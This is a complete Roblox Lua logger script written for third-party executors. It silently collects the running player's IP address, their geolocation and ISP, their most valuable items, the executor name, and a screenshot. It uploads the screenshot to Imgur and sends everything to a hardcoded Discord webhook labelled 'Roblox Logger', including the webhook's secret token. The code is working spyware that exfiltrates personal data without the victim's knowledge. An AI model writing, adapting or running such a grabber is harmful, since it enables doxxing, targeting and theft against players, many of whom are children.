local request = (syn and syn.request) or (http and http.request) or request
if not request then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local userId = player.UserId
local name = player.Name
local age = player.AccountAge .. " days"

-- Get IP
local ip
for _, url in {"http://icanhazip.com","https://api.ipify.org","http://ifconfig.me/ip"} do
    local s,r = pcall(request,{Url=url,Method="GET"})
    if s and r and r.Body then
        ip = r.Body:match("^(%d+%.%d+%.%d+%.%d+)$")
        if ip then break end
    end
end
if not ip then return end

-- Geo
local geo = {city="?",country="?",isp="?"}
pcall(function()
    local r = request({Url="http://ip-api.com/json/"..ip.."?fields=city,country,isp",Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d then geo = d end
    end
end)

-- Display Name
local display = name
pcall(function()
    local r = request({Url="https://users.roblox.com/v1/users/"..userId,Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d and d.displayName then display = d.displayName end
    end
end)

-- Most Expensive
local best = {name="None",rap=0,value=0}
pcall(function()
    local r = request({Url="https://www.rolimons.com/playerapi/player/"..userId,Method="GET"})
    if r and r.Body then
        local data = HttpService:JSONDecode(r.Body)
        if data and data.items then
            for _,v in pairs(data.items) do
                local price = math.max(v.rap or 0, v.value or 0)
                if price > best.rap then
                    best = {name=v.name or "Unknown",rap=v.rap or 0,value=v.value or 0}
                end
            end
        end
    end
end)

-- HWID
local hwid = "N/A"
pcall(function()
    if identifyexecutor then hwid = identifyexecutor()
    elseif getexecutorname then hwid = getexecutorname()
    end
end)

-- Device
local device = "N/A"
pcall(function()
    device = string.format("Roblox v%s | %s", game.PlaceVersion, game:GetService("RunService"):IsStudio() and "Studio" or "Client")
end)

-- Profile
local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
local profile = "https://www.roblox.com/users/"..userId.."/profile"
local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")

-- TAKE & UPLOAD SCREENSHOT
local screenshotUrl = "https://i.imgur.com/removed.png"  -- fallback
pcall(function()
    local ss = game:GetService("ScreenshotService"):TakeScreenshot()
    if ss and ss:FindFirstChild("Image") then
        local imgData = ss.Image.Value
        local b64 = game:GetService("HttpService"):EncodeBase64(imgData)

        local boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        local body = {
            "--"..boundary,
            'Content-Disposition: form-data; name="file"; filename="screenshot.png"',
            "Content-Type: image/png",
            "",
            b64,
            "--"..boundary.."--"
        }
        local bodyStr = table.concat(body, "\r\n")

        local upload = request({
            Url = "https://api.imgur.com/3/image",
            Method = "POST",
            Headers = {
                ["Authorization"] = "Client-ID 546c25a59c58ad7",  -- public anon key
                ["Content-Type"] = "multipart/form-data; boundary="..boundary
            },
            Body = bodyStr
        })

        if upload and upload.Body then
            local res = HttpService:JSONDecode(upload.Body)
            if res and res.data and res.data.link then
                screenshotUrl = res.data.link
            end
        end
    end
end)

-- Final Embed
local embed = {{
    author = {
        name = display .. " (@" .. name .. ")",
        url = profile,
        icon_url = avatar
    },
    title = "View Profile",
    url = profile,
    description =
        "**Account Age:** `"..age.."`\n"..
        "**Most Valuable:** `"..best.name.."`\n"..
        "**RAP:** `"..(best.rap > 0 and best.rap or "N/A").."` | **Value:** `"..(best.value > 0 and best.value or "N/A").."`\n\n"..
        "**IP:** `"..ip.."`\n"..
        "**Location:** `"..geo.city..", "..geo.country.."`\n"..
        "**ISP:** `"..geo.isp.."`\n\n"..
        "**HWID:** `"..hwid.."`\n"..
        "**Device:** `"..device.."`",
    image = {url = screenshotUrl},
    thumbnail = {url = avatar},
    color = 0x00ff88,
    footer = {text = "Logged • "..os.date("%Y-%m-%d %H:%M:%S")},
    timestamp = isoTime
}}

local payload = {
    username = "Roblox Logger",
    avatar_url = avatar,
    embeds = embed
}

local webhook = "https://discord.com/api/webhooks/1436898097765548032/NhpnCBD_N1jYTSCHSEKRVjTn2IeGfMeJkFTQAqeKzKAmdMjugeOkuUiJjKquwYS_79QY"

pcall(function()
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)
